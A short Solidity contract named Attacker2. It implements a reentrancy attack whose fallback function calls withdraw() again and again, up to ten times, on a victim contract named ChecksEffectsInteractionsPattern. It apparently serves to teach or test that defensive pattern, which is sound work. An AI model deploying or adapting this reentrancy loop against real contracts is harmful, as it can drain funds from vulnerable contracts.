pragma solidity ^0.7.0;

import './ChecksEffectsInteractionsPattern.sol';

contract Attacker2 {
  ChecksEffectsInteractionsPattern v;
  uint256 public count;


  event LogFallback(uint c, uint balance);

  constructor (ChecksEffectsInteractionsPattern victim) {
    v = ChecksEffectsInteractionsPattern(victim);
  }

  function attack() public {
    v.withdraw();
  }

  fallback() external payable {
    count++;

    emit LogFallback(count, address(this).balance);
    if (count < 10) {
      v.withdraw();
    } 
  }
}